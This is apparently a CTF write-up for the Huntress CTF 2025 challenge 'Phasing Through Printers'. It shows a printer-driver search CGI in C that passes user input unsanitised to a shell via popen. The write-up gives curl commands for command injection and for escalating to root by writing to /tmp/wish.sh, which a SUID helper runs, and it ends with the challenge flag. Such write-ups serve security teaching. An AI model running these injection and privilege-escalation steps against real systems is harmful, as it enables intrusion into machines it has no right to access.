---

layout: post
title: "Huntress CTF 2025 - Phasing Through Printers"
categories: writeup misc 
permalink: :categories/:title

---


## Challenge Description

>I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?
>
Here is some of the code I could dig up.

NOTE

>Escalate your privileges and uncover the flag in the **`root`** user's home directory.

---

## Thought process:

We are provided with folder that has this structure:

```
├── cgi-bin
│   └── search.c
└── www
    └── index.html
```

And also give the ip of web application that is running.

Lets see what we have in index.html and search.c:

### search.c:

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <string.h>

void urldecode2(char *dst, char *src)
{
        char a, b;
        while (*src) {
                if ((*src == '%') &&
                    ((a = src[1]) && (b = src[2])) &&
                    (isxdigit(a) && isxdigit(b))) {
                        if (a >= 'a')
                                a -= 'a'-'A';
                        if (a >= 'A')
                                a -= ('A' - 10);
                        else
                                a -= '0';
                        if (b >= 'a')
                                b -= 'a'-'A';
                        if (b >= 'A')
                                b -= ('A' - 10);
                        else
                                b -= '0';
                        *dst++ = 16*a+b;
                        src+=3;
                } else if (*src == '+') {
                        *dst++ = ' ';
                        src++;
                } else {
                        *dst++ = *src++;
                }
        }
        *dst++ = '\0';
}
int main ()
{
   char *env_value;
   char *save_env;

   printf("Content-type: text/html\n\n");
   save_env = getenv("QUERY_STRING");
   if (strncmp(save_env, "q=", 2) == 0) {
        memmove(save_env, save_env + 2, strlen(save_env + 2) + 1);

    }

   char *decoded = (char *)malloc(strlen(save_env) + 1);

   urldecode2(decoded, save_env);


   char first_part[] = "grep -R -i ";
   char last_part[] = " /var/www/html/data/printer_drivers.txt" ;
   size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
   char *combinedString = (char *)malloc(totalLength);
   if (combinedString == NULL) {
        printf("Failed to allocate memory");
        return 1;
   }
   strcpy(combinedString, first_part);
   strcat(combinedString, decoded);
   strcat(combinedString, last_part);
   FILE *fp;
   char buffer[1024];

   fp = popen(combinedString, "r");
   if (fp == NULL) {
      printf("Error running command\n");
      return 1;
   }
   while (fgets(buffer, sizeof(buffer), fp) != NULL) {
      printf("%s<br>", buffer);
   }

   pclose(fp);

   fflush(stdout);
   free(combinedString);
   free(decoded);
   exit (0);
}
```

### index.html:

```html
</head>
<body>
  <h1>Printer Driver Search</h1>
  <form action="/cgi-bin/search.cgi" method="get">
    <input type="text" name="q" placeholder="Enter printer model or driver name" />
    <input type="submit" value="Search"/>
  </form>
</body>
</html>
```

So it takes our input and creates request with adding these two lines:

```c
   char first_part[] = "grep -R -i ";
   char last_part[] = " /var/www/html/data/printer_drivers.txt" ;
```

So if we searched for example for string "test" request would be:

```bash
grep -R -i test /var/www/html/data/printer_drivers.txt
```

Now it is obvious it will be command injection because we are able to create request that will execute on a server, but we need to modify it a little:

if we can make first and last part sepperate commands we can send a command:

if we are able to send a request that looks like this we can execute commands on an server:

`;whoami;`

lets URL encode the `;` and send request with curl:

after sending request like this:

```
curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bwhoami%3B%3B
```

We receive response that confirms our hypotesis:

`www-data`

With this we would be able to gain reverse shell but I found it faster and easier to interact with the server just by commands, and after some commands to see if we can escalate our privilages. After some digging I looked at the files with the **SUID bit set** (the setuid permission):

`find / -perm -4000 -type f 2>&1`

`curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bfind%20/%20-perm%20-4000%20-type%20f%202%3E%261%3B"`

And we see one interesting application that has SUID bit set:

`/usr/local/bin/admin_help`

My first thought was to somehow get it on my machine and preform some reverse engineering but first I ran strings to see if there is anything interesting:

```
curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bstrings%20/usr/local/bin/admin_help%3B"
```

And I saw this part:

```
<br>Your wish is my command... maybe :)
<br>chmod +x /tmp/wish.sh && /tmp/wish.sh
```

So it gives temp file called wish.sh executable bit and executes it. Can we create that file and write to it what we want, lets see if we have privileges to create files in `/tmp` folder:

```
curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bls%20-ld%20%2Ftmp%3B"
drwxrwxrwt 1 root root 4096 Oct 15 13:13 /tmp
```

that part at the end: `rwt` means others can read, write, execute + **sticky bit**

Lets echo a command to that file and then run `/usr/local/bin/admin_help`

## Exploit:

`;echo "whoami" >  /tmp/wish.sh & /usr/local/bin/admin_help;`

URL encoding it and sending a request with curl we get:

```
curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22whoami%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"

root
```

And just like that we pwned the system now only thing left is to cat the flag as root.

## Final exploit

`;echo "cat /root/flag.txt" >  /tmp/wish.sh & /usr/local/bin/admin_help;`

URL encoding it and sending a request with curl we get the flag:

```
curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22cat%20%2Froot%2Fflag%2Etxt%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"

flag{93541544b91b7d2b9d61e90becbca309}
```
